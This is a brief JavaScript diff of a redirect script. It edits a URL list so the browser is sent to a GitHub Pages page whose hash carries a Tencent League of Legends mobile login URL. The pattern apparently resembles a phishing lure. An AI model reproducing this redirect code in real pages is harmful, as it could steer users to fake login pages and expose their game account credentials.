@@ -7,7 +7,7 @@ function leleua() {
 }
 
 var urls=[
-'https://ccffq.github.io/ff.html?{nnnnnnnnnnn}{wwwwww}',
+'https://ccffq.github.io/ff.html?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html/&{nnnnnnnnnnn}{wwwwww}',
 ];
 location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
 function myEeplace(s){
